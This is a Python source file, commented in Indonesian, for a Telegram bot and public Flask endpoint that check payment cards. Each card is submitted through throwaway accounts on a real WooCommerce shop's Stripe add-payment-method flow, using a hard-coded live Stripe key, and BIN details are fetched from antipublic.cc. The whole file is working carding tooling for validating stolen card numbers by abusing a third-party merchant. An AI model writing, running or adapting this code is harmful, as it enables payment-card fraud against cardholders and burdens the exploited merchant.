import os
import re
import random
import string
import threading
import logging
import requests
from flask import Flask, request, jsonify
import telebot

# ==================== KONFIGURASI ====================
STRIPE_PUBLIC_KEY = "pk_live_51TWskSF79lbCDrn2YUT5OTMiCtJOtfjPRdu5Fvi77BXKcyrqYdDV43q7k7XTJlO8docnOY45e6KdcPZdYzPoyFRr00Xlnsy2Wn"
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TELEGRAM_TOKEN:
    raise ValueError("Environment variable TELEGRAM_BOT_TOKEN tidak ditemukan!")

# ==================== SETUP LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== FUNGSI UTAMA (Stripe Check) ====================
def full_stripe_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
    })

    if len(yy) == 4:
        yy = yy[-2:]

    try:
        # 1. Ambil login nonce
        login_page_res = session.get('https://shop.wiseacrebrew.com/account/')
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        if not login_nonce_match:
            return {"status": "Declined", "response": "Failed to get login nonce.", "decline_type": "process_error"}
        login_nonce = login_nonce_match.group(1)

        # 2. Daftar akun random
        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
        register_data = {
            'email': random_email, 'password': 'Password123!', 'woocommerce-register-nonce': login_nonce,
            '_wp_http_referer': '/account/', 'register': 'Register',
        }
        session.post('https://shop.wiseacrebrew.com/account/', data=register_data)

        # 3. Ambil payment nonce
        payment_page_res = session.get('https://shop.wiseacrebrew.com/account/add-payment-method/')
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        if not payment_nonce_match:
            return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
        ajax_nonce = payment_nonce_match.group(1)

        # 4. Dapatkan token dari Stripe (menggunakan key LIVE yang baru)
        stripe_data = (
            f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
            f'&key={STRIPE_PUBLIC_KEY}'
        )
        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
        if stripe_response.status_code == 402:
            error_message = stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.')
            return {"status": "Declined", "response": error_message, "decline_type": "card_decline"}
        payment_token = stripe_response.json().get('id')
        if not payment_token:
            return {"status": "Declined", "response": "Failed to retrieve Stripe token.", "decline_type": "process_error"}

        # 5. Submit ke website
        site_data = {
            'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_token,
            'wc-stripe-payment-type': 'card', '_ajax_nonce': ajax_nonce,
        }
        final_response = session.post('https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
        response_json = final_response.json()

        if "Unable to verify your request" in response_json.get('messages', ''):
            return {"status": "Declined", "response": "Unable to verify request.", "decline_type": "process_error"}
        if response_json.get('success') is False or response_json.get('status') == 'error':
            error_message = (response_json.get('data', {}).get('error', {}).get('message') or
                             re.sub('<[^<]+?>', '', response_json.get('messages', 'Declined by website.')))
            return {"status": "Declined", "response": error_message.strip(), "decline_type": "card_decline"}
        if response_json.get('status') == 'succeeded':
            return {"status": "✅ Approved", "response": "Payment method successfully added.", "decline_type": "none"}
        else:
            return {"status": "Declined", "response": "Unknown response from website.", "decline_type": "process_error"}

    except Exception as e:
        logger.error(f"Error di full_stripe_check: {e}")
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}", "decline_type": "process_error"}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        logger.warning(f"Gagal ambil BIN info: {e}")
    return {}

# ==================== BOT TELEGRAM (POLLING) ====================
bot = telebot.TeleBot(TELEGRAM_TOKEN, parse_mode=None)

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message,
                 "💳 *Card Checker Bot*\n\n"
                 "Kirim data kartu dengan format:\n"
                 "`CC|MM|YY|CVV`\n\n"
                 "Contoh:\n"
                 "`4111111111111111|12|25|123`\n\n"
                 "Bot akan memeriksa kartu melalui Stripe + website.",
                 parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def handle_card_check(message):
    text = message.text.strip()
    logger.info(f"Pesan dari {message.chat.id}: {text}")

    # Kirim "sedang diproses" agar user tahu bot merespon
    bot.send_chat_action(message.chat.id, 'typing')

    # Validasi format
    pattern = r'^(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$'
    match = re.match(pattern, text)
    if not match:
        bot.reply_to(message,
                     "❌ *Format salah!*\nGunakan: `CC|MM|YY|CVV`\nContoh: `4111111111111111|12|25|123`",
                     parse_mode="Markdown")
        return

    cc, mm, yy, cvv = match.groups()

    # Lakukan pengecekan
    try:
        result = full_stripe_check(cc, mm, yy, cvv)
        bin_info = get_bin_info(cc[:6])

        # Format hasil balasan
        flag = bin_info.get('country_flag', '')
        country = bin_info.get('country_name', 'Unknown')
        bank = bin_info.get('bank', 'Unknown')
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')

        reply_text = (
            f"🏦 *BIN Info:* {cc[:6]}XXXX\n"
            f"💳 {brand} - {card_type}\n"
            f"🌍 {flag} {country}\n"
            f"🏛 {bank}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📌 *Status:* {result['status']}\n"
            f"📝 *Response:* {result['response']}\n"
        )
        if result['decline_type'] != 'none':
            reply_text += f"⚠️ *Decline Type:* {result['decline_type']}\n"

        bot.reply_to(message, reply_text, parse_mode="Markdown")

    except Exception as e:
        logger.error(f"Error saat handle pesan: {e}")
        bot.reply_to(message, "❌ Terjadi kesalahan internal. Coba lagi nanti.")

# ==================== FLASK (HEALTH CHECK + API ENDPOINT) ====================
app = Flask(__name__)

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "alive", "service": "telegram bot + stripe checker"}), 200

@app.route('/check', methods=['GET'])
def check_card_endpoint():
    """Endpoint API publik (sama seperti di file lama)"""
    card_str = request.args.get('card')
    if not card_str:
        return jsonify({"error": "Parameter 'card' diperlukan. Format: CC|MM|YY|CVV"}), 400

    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
    if not match:
        return jsonify({"error": "Format tidak valid. Gunakan CC|MM|YY|CVV"}), 400

    cc, mm, yy, cvv = match.groups()
    check_result = full_stripe_check(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])

    final_result = {
        "status": check_result["status"],
        "response": check_result["response"],
        "decline_type": check_result["decline_type"],
        "bin_info": {
            "brand": bin_info.get('brand', 'Unknown'),
            "type": bin_info.get('type', 'Unknown'),
            "country": bin_info.get('country_name', 'Unknown'),
            "country_flag": bin_info.get('country_flag', ''),
            "bank": bin_info.get('bank', 'Unknown'),
        }
    }
    return jsonify(final_result)

# ==================== MAIN: JALANKAN BOT DI THREAD + FLASK ====================
def start_bot_polling():
    """Menjalankan bot polling di thread terpisah"""
    logger.info("Memulai bot Telegram (polling)...")
    try:
        bot.infinity_polling(timeout=30, long_polling_timeout=30)
    except Exception as e:
        logger.error(f"Bot polling error: {e}")

if __name__ == '__main__':
    # Jalankan bot di background thread
    bot_thread = threading.Thread(target=start_bot_polling, daemon=True)
    bot_thread.start()

    # Jalankan Flask server (diperlukan untuk Render)
    port = int(os.environ.get("PORT", 10000))
    logger.info(f"Menjalankan Flask di port {port}")
    app.run(host='0.0.0.0', port=port, threaded=True)
